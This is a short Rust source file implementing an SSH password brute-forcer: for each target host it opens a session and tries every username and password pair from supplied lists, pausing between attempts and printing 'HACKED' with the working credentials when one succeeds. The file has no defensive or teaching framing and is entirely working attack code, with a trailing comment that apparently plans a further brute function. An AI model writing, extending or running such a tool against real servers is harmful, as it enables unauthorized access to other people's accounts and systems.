use std::net::TcpStream;
use ssh2::Session;
use std::{thread, time};

pub fn ssh(target: Vec<String>, usernames: &'static [&'static str], passwords: &'static [&'static str]) {
    for target in target {
        let tcp = TcpStream::connect(&target).unwrap();
        let mut sess = Session::new().unwrap();
        sess.set_tcp_stream(tcp);
        sess.handshake().unwrap();

        'brutessh: for user in usernames {
            for pass in passwords {
                let did_it_work = sess.userauth_password(&user, &pass);

                match did_it_work {
                    Err(_) => println!("failed: {} - {}/{}", &target, user, pass),
                    Ok(_) => {
                        println!("\x1b[93mHACKED {} - {}/{}\x1b[0m", &target, user, pass);
                        break 'brutessh;
                    },
                }
                thread::sleep(time::Duration::from_millis(500));
            }
        }
    }
}

/*
    write the brute function
*/
